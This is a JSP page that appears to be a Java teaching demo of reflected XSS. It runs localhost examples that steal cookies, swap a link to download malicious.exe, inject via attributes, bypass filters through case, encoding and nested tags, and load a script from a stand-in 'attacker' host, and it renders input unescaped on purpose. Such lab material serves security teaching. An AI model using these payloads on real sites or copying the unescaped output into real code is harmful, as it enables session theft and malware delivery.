<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Insert title here</title>

</head>
<body>
	<!-- 	测试连接：http://localhost:8080/s/xss/non-persisent?name=<script>eval("alert('java')")</script> -->
	<!-- 	测试连接：http://localhost:8080/s/xss/non-persisent?name=<script>eval("alert(document.cookie)")</script> -->
	<!--    测试连接： http://is.gd/x4nOK4 -->
	例子1：</br>
	输入参数：http://localhost:8080/s/xss/non-persisent?name=&lt;script&gt;eval("alert(document.cookie)")&lt;/script&gt;</br>
	输入参数对应短域名： http://is.gd/x4nOK4</br>
	后台没有转义:${name}</br>
	后台执行转义:${escapeName}
	<hr/>
	例子2：当点击这个连接时会下载malicious.exe，至于用户会不会下载，会不会点击执行自己想吧</br>
	输入参数：http://localhost:8080/s/xss/non-persisent?name=&lt;script&gt;window.onload = function() {var AllLinks=document.getElementsByTagName("a"); AllLinks[0].href = "http://localhost:8080/s/malicious.exe"; }&lt;/script&gt;</br>
	<a >测试连接</a>
	<hr/>
	例子3：标签属性注入</br>
	输入参数：【" onfocus="alert(document.cookie)】 <input type="text" name="state" value="${name}">
	<hr/>
	例子4：不同的语法和编码，URLEncode</br>
	输入参数：</br>
		1. "&gt;&lt;script &gt;alert(document.cookie)&lt;/script &gt; 注意最后一个>前边的空格</br>
		2. "&gt;&ltScRiPt&gt;alert(document.cookie)&lt;/ScRiPt&gt;  注意script的大小写</br>
		3. "%3cscript%3ealert(document.cookie)%3c/script%3e	转码</br>
	效果看这里：<input type="text" name="state" value="${name}">
	<hr/>
	例子5：简单过过滤器</br>
	输入参数：&lt;scr&lt;script&gt;ipt&gt;alert('call name.replace("&lt;scr&lt;", "")')&lt;/script&gt;</br>
	后台执行name.replace("&lt;scr&lt;", "")的结果: ${replacename}</br>
	<hr/>
	例子6：引入js 避免在url中输入过长的代码</br>
	输入参数：&lt;script src="http://attacker/xss.js"&gt;&lt;/script&gt;
	
	http://static.video.qq.com/TPout.swf?auto=1&vid=a1063iquj3i
</body>
</html>